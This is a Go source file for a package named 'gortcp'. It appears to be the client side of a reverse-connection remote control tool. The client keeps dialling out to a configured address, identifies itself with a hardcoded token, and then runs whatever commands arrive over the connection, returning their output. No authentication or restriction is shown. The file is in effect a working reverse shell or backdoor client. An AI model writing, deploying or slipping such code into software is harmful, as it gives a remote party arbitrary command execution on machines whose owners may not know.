package gortcp

import (
	"net"
	"os/exec"
	"strings"
	"time"
)

type Client struct {
	Addr string
	wrap *MessageWrap
}

func (c *Client) handlerMessage(m *Message) {
	switch m.msgType {
	case execCmdMessage:
		m := &Message{msgType: execCmdResultMessage, content: c.execCommand(string(m.content))}
		c.wrap.SendOneMessage(m)
	case uploadFileMessage:
		logger.Debug(string(m.content))
	default:
		logger.Debug(string(m.content))
	}

}

func (c *Client) execCommand(cmd string) []byte {
	logger.Debugf("exec cmd is :%s", cmd)
	cmd = strings.TrimSpace(cmd)
	args := strings.Fields(cmd)
	exp := exec.Command(args[0], args[1:]...)
	res, err := exp.CombinedOutput()
	if err == nil {
		return res
	} else {
		return []byte(err.Error())
	}

}

func (c *Client) HandlerMessage() {
	for {
		m, err := c.wrap.ReadOneMessage()
		if err != nil {
			return
		}
		c.handlerMessage(m)
	}
}

func (c *Client) Connect() {

	for {
		conn, err := net.Dial("tcp", c.Addr)
		if err != nil {
			logger.Errorf(err.Error())
			time.Sleep(20 * time.Second)
		} else {
			c.handlerConn(conn)
		}
	}
}

func (c *Client) handlerConn(conn net.Conn) {
	defer conn.Close()
	c.wrap = &MessageWrap{rw: conn}
	msg := &Message{msgType: connectMessage, content: []byte("abcde12345")}
	err := c.wrap.SendOneMessage(msg)
	if err != nil {
		return
	}
	c.HandlerMessage()

}
